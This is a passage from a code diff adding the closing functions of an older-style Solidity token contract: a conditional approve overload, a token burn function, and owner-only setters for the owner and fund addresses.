+     * allowance differs from an assumed one, this method just returns false.
+     *
+     * @param _spender address to allow the owner of to transfer tokens from
+     *        message sender
+     * @param _currentValue assumed number of tokens currently allowed to be
+     *        transferred
+     * @param _newValue number of tokens to allow to transfer
+     * @return true if token transfer was successfully approved, false otherwise
+     */
+    function approve (address _spender, uint256 _currentValue, uint256 _newValue)
+    returns (bool success) {
+      if (allowance (msg.sender, _spender) == _currentValue)
+        return approve (_spender, _newValue);
+      else return false;
+    }
+
+    /**
+     * Burn given number of tokens belonging to message sender.
+     *
+     * @param _value number of tokens to burn
+     * @return true on success, false on error
+     */
+    function burnTokens (uint256 _value) returns (bool success) {
+      if (_value > accounts [msg.sender]) return false;
+      else if (_value > 0) {
+        accounts [msg.sender] = safeSub (accounts [msg.sender], _value);
+        tokensCount = safeSub (tokensCount, _value);
+        return true;
+      } else return true;
+    }
+
+    /**
+     * Set new owner for the smart contract.
+     * May only be called by smart contract owner.
+     *
+     * @param _newOwner address of new owner of the smart contract
+     */
+    function setOwner (address _newOwner) {
+      require (msg.sender == owner);
+
+      owner = _newOwner;
+    }
+
+    
+    /**
+     * Set new fund address for the smart contract.
+     * May only be called by smart contract owner.
+     *
+     * @param _newFund new fund address of the smart contract
+     */
+    function setFundAddress (address _newFund) {
+      require (msg.sender == owner);
+
+      fund = _newFund;
+    }
+
+  }
